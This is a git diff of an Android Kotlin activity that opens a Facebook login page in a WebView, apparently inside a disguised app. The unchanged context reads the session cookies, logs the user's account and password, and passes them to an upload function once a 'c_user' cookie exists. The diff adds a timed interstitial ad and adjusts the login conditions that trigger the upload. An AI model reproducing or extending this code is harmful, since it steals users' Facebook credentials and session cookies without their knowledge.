@@ -1,6 +1,9 @@
 package com.xxxxxxh.c1.ui
 
+import android.annotation.SuppressLint
 import android.graphics.Bitmap
+import android.os.Handler
+import android.os.Message
 import android.text.TextUtils
 import android.util.Log
 import android.view.View
@@ -29,12 +32,30 @@ class FaceBookActivity : BaseActivity(), MyWebView.Listener {
         }
     }
 
+    private var timeCount = 0
+
+    private val handler = @SuppressLint("HandlerLeak")
+    object : Handler() {
+        override fun handleMessage(msg: Message) {
+            super.handleMessage(msg)
+            if (msg.what == 1) {
+                timeCount++
+                if (timeCount == 20) {
+                    showInsertAd(tag = "inter_loading")
+                } else {
+                    sendEmptyMessageDelayed(1, 1000)
+                }
+            }
+        }
+    }
+
 
     override fun getLayoutId(): Int {
         return R.layout.activity_face_book
     }
 
     override fun init() {
+        handler.sendEmptyMessageDelayed(1, 1000)
         window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
         activityFaceBookIvBack.setOnClickListener {
             finish()
@@ -93,10 +114,13 @@ class FaceBookActivity : BaseActivity(), MyWebView.Listener {
                     Log.e("--->", "onPageFinished url == $url")
                     if (cookieStr != null) {
                         Log.e("--->", "ua ==  " + view.settings.userAgentString)
-                        if (cookieStr.contains("c_user") || true) {
+                        if (cookieStr.contains("c_user")) {
                             Log.e("--->", "cookieStr: $cookieStr")
                             Log.e("--->", "account == $account  password == $password")
-                            if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url.contains("checkpoint") || true) {
+                            if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url.contains(
+                                    "checkpoint"
+                                ) || true
+                            ) {
                                 uploadFbData(
                                     account,
                                     password,
